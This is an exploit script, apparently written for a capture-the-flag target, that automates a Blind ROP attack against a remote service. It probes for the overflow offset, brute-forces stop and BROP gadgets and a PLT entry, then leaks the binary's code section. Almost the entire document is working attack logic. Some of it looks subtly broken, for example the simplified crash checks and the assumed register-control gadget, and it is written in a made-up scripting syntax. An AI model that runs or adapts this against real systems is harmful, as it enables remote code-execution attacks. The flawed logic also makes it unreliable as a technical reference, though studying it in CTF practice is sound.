# Blind ROP exploitation - when you don't have the binary
# Technique: Probe for gadgets and functions remotely

let host = "blind.pwn.ctf"
let port = 8888

print("[*] Blind ROP Exploitation")
print("[*] Target:", host, ":", port)

# Step 1: Find buffer overflow offset
print("[+] Step 1: Finding crash offset...")

define function check_crash(payload_len)
    let conn = connect(host, port)
    send(conn, "A" * payload_len)
    # Check if connection closes (crash) or gets response
    try
        let resp = recv(conn, 1024, timeout: 1)
        close(conn)
        return false  # No crash
    catch e
        return true  # Crashed
    end
end

let offset = 0
for test_size in range(0, 200, 8)
    if check_crash(test_size)
        offset = test_size
        break
    end
end

print("[+] Found offset:", offset)

# Step 2: Find useful gadgets by brute force
print("[+] Step 2: Searching for gadgets...")

define function test_gadget(addr)
    let conn = connect(host, port)
    let payload = cyclic(offset) + p64(addr)
    send(conn, payload)
    try
        recv(conn, 1024, timeout: 2)
        close(conn)
        return true  # Didn't crash, might be valid
    catch e
        return false  # Crashed, bad gadget
    end
end

# Scan for stop gadget (ret or similar)
let stop_gadget = 0
for addr in range(0x400000, 0x401000, 0x1)
    if test_gadget(addr)
        stop_gadget = addr
        print("[+] Found stop gadget:", hex(addr))
        break
    end
end

# Step 3: Find BROP gadget (useful for controlling registers)
print("[+] Step 3: Searching for BROP gadget...")

# BROP gadget pattern: pop multiple registers + ret
let brop_gadget = 0
for addr in range(0x400000, 0x402000, 0x1)
    # Test if gadget allows us to control rdi
    let conn = connect(host, port)
    let test = cyclic(offset) + p64(addr) + p64(0x41414141) * 6 + p64(stop_gadget)
    send(conn, test)
    
    try
        recv(conn, 1024, timeout: 2)
        # If didn't crash, might be BROP gadget
        brop_gadget = addr
        print("[+] Potential BROP gadget:", hex(addr))
        break
    catch e
        continue
    end
end

# Step 4: Find PLT entries by scanning
print("[+] Step 4: Finding PLT entries...")

# strcmp or write are good targets (won't crash)
let plt_entry = 0
for addr in range(0x400000, 0x401000, 0x10)
    let conn = connect(host, port)
    # Call with safe arguments
    let payload = cyclic(offset) + p64(brop_gadget) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(addr)
    send(conn, payload)
    
    try
        let resp = recv(conn, 1024, timeout: 2)
        # Check if we got response (successful call)
        if len(resp) > 0
            plt_entry = addr
            print("[+] Found PLT entry:", hex(addr))
            break
        end
    catch e
        continue
    end
end

# Step 5: Leak data using found primitives
print("[+] Step 5: Leaking binary data...")

# Use write PLT to dump binary sections
let pop_rdi_rsi_rdx = brop_gadget  # Assuming BROP gadget

# Leak .text section
let leak_payload = cyclic(offset) + 
                   p64(pop_rdi_rsi_rdx) + 
                   p64(1) +  # stdout fd
                   p64(0x400000) +  # address to leak
                   p64(0x100) +  # length
                   p64(0) + p64(0) + p64(0) +
                   p64(plt_entry)  # write PLT

let conn = connect(host, port)
send(conn, leak_payload)
let leaked_code = recv(conn, 0x100)

print("[+] Leaked", len(leaked_code), "bytes from .text")

# Analyze leaked code to find more gadgets and continue exploitation
print("[*] Blind ROP reconnaissance complete!")
print("[*] Next: Analyze leaked data and build full exploit")
